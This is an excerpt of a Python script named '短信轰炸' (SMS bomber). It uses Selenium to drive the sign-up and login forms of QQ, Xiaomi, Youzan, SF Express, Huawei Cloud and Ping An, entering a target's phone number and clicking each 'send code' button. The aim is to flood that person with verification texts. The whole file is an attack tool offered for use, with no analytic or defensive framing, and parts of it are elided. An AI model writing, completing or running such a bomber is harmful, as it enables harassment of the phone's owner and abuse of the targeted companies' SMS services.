#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @FileName  :py_venv -> 短信轰炸.py
# @IDE       :PyCharm
# @Time      :2022/12/6 23:40
# @Author    :Victor
...
class HongZha:
    ...
    def qq(self, name):
        try:
            ...
            driver.find_element_by_xpath('/html/body/div[3]/div[2]/div[1]/form/div[5]/div/div[1]').click()
            button = driver.find_element_by_xpath('/html/body/div[3]/div[2]/div[1]/form/div[4]/div[1]/div[2]/button')
    ...
    def xiaomi(self, name):
        try:
            ...
            driver.find_element_by_xpath(
                '//*[@id="rc-tabs-0-panel-register"]/form/div[1]/div[4]/label/span[1]/span').click()
            button = driver.find_element_by_xpath(
                '//*[@id="rc-tabs-0-panel-register"]/form/div[1]/div[3]/div/div[2]/button')
            self.send_yzm(button, name)
        except:
            print('本次失败')
    ...
    def youzan(self, name):
        try:
            ...
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//*[@id="app"]/div/div[1]/div[1]/div/form/div[1]/div[2]/input').send_keys(self.phone)
    ...
    # 顺风速运
    def shunfeng1(self, name):
        try:
            driver.get('https://www.sf-express.com/we/ow/chn/sc/index')
            driver.implicitly_wait(30)
            driver.find_element_by_xpath('//*[@id="app"]/div[2]/div/span[1]').click()
            driver.find_element_by_xpath('/html/body/div[7]/div/div[1]/div[1]/span[2]').click()
            driver.find_element_by_xpath(
                '/html/body/div[7]/div/div[2]/div/div[1]/form/div[1]/input').send_keys(
                self.phone)
            driver.find_element_by_xpath('/html/body/div[7]/div/div[2]/div/div[2]/div').click()
            button = driver.find_element_by_xpath(
                '/html/body/div[7]/div/div[2]/div/div[1]/form/div[2]/input[2]')
            self.send_yzm(button, name)
        except:
            print('本次失败')
    ...
    def huaweiyun(self, name):
        ...
        driver.find_element_by_xpath('//*[@id="registerForm"]/div/div[2]/div[1]/div[2]/div[1]/div[3]/input').send_keys(self.phone)
        button = driver.find_element_by_xpath('//*[@id="registerForm"]/div/div[2]/div[1]/div[4]/div[1]/div[2]/div/div/div')
        self.send_yzm(button, name)
    ...
    def pinanhaodai(self, name):
        ...
        driver.find_element_by_xpath('//input[@id="name"]').send_keys(username)
        driver.find_element_by_xpath('//input[@id="phone"]').send_keys(self.phone)
        driver.find_element_by_xpath('//*[@id="niceform"]/div[5]/div[1]').click()
